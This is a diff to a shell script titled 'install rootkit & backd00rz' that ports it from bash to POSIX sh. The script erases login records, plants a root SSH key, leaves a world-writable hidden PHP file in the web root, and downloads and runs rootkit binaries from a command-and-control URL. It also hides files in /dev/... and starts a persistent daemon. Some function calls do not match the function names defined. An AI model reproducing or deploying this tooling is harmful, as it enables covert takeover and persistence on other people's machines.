@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/bin/sh
 # cmc / sapling
 # 3/6/15
 # install rootkit & backd00rz
@@ -71,7 +71,7 @@ ROOTYBSD="rootybsd.x64"
 
 ARCH=`uname -i`
 
-function do_backdoors() {
+do_backdoors() {
         echo "removing utmp.."
         rm -rf /var/run/utmp
         echo "installing root ssh key!"
@@ -105,7 +105,7 @@ function do_backdoors() {
         chmod 777 /var/www/html/.src.php
 }
 
-function do_bsdbackdoors() {
+do_bsdbackdoors() {
         echo "installing root ssh key!"
         echo $PUBKEY >> /root/.ssh/authorized_keys2
         echo $PUBKEY >> /root/.ssh/authorized_keys
@@ -119,7 +119,7 @@ function do_bsdbackdoors() {
 }
 
 
-function do_centos_rootkit() {
+do_centos_rootkit() {
 	echo "Retrieving CentOS x86 kit..."
 	mkdir /dev/... 
 	cd /dev/...
@@ -128,7 +128,7 @@ function do_centos_rootkit() {
 	./`basename $CENTOS_KIT`
 }
 
-function do_centos64_rootkit() {
+do_centos64_rootkit() {
 	echo "Retrieving CentOS x64 kit..."
 	mkdir /dev/...
 	cd /dev/...
@@ -138,7 +138,7 @@ function do_centos64_rootkit() {
 }
 
 
-function do_freebsd64_rootkit() {
+do_freebsd64_rootkit() {
     cd /opt/
     wget -q $C2_URL$BSD_KIT
     chmod 0755 `basename $BSD_KIT`
@@ -146,7 +146,7 @@ function do_freebsd64_rootkit() {
     nohup /opt/scorebotd &
 }
 
-function do_ubuntu_rootkit() {
+do_ubuntu_rootkit() {
 	echo "Retrieving ubuntu x86 kit..."
 	mkdir /dev/...
 	cd /dev/...
@@ -156,7 +156,7 @@ function do_ubuntu_rootkit() {
 }
 
 
-function do_ubuntu64_rootkit() {
+do_ubuntu64_rootkit() {
 echo "Retrieving ubuntu x64 kit..."
     mkdir /dev/... 
     cd /dev/...
@@ -165,7 +165,7 @@ echo "Retrieving ubuntu x64 kit..."
     ./`basename $UBUNTU64_KIT`
 }
 
-function goodbye_sla() {
+goodbye_sla() {
     cat <<EOF > /usr/share/service.sh
 #!/bin/bash
 #UMAD?
@@ -193,13 +193,13 @@ nohup /usr/share/service.sh >/dev/null 2>&1 &
 }
 
 #64bit fedora
-if [[ $ARCH -eq "x86_64" ]] && [[ -f "/etc/redhat-release" ]]; then
+if [ $ARCH = "x86_64" ] && [ -f "/etc/redhat-release" ]; then
 	do_centos64_rootkit
 	do_backdoors
 fi
 
 #32bit fedora
-if [[ $ARCH -ne "x86_64" ]] && [[ -f "/etc/redhat-release" ]]; then
+if [ $ARCH != "x86_64" ] && [ -f "/etc/redhat-release" ]; then
 	do_centos_rootkit
 	do_backdoors
         #goodbye_sla
@@ -207,14 +207,14 @@ fi
 
 
 #ubuntu/debian 64bit 
-if [[ $ARCH -eq "x86_64" ]] && [[ -f "/etc/debian_version" ]]; then
+if [ $ARCH  = "x86_64" ] && [ -f "/etc/debian_version" ]; then
     do_ubuntu64_rootkit
     do_backdoors
     #goodbye_sla
 fi
 
 #ubuntu/debian 32bit (assumed if not 64, whatever)
-if [[ $ARCH -ne "x86_64" ]] && [[ -f "/etc/debian_version" ]]; then
+if [ $ARCH != "x86_64" ] && [ -f "/etc/debian_version" ]; then
 	do_ubuntu32_rootkit
 	do_backdoors
 	#goodbye_sla
@@ -222,7 +222,7 @@ fi
 
 
 #freebsd
-if [[ `uname`  == 'FreeBSD' ]]; then
+if [ `uname`  = 'FreeBSD' ]; then
 	do_freebsd64_kit
 	do_bsdbackdoors    
 fi
